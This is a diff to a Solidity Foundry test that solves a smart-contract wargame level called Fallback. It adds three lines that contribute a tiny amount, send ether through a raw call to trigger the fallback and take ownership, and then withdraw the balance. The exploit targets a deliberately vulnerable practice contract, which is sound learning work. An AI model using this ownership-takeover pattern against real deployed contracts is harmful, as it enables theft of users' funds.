@@ -35,9 +35,10 @@ contract TestFallback is BaseTest {
 
     function exploitLevel() internal override {
         /** CODE YOUR EXPLOIT HERE */
-
         vm.startPrank(player);
-
+        level.contribute{value: 1}();
+        address(level).call{value: 1}("");
+        level.withdraw();
         vm.stopPrank();
     }
 }
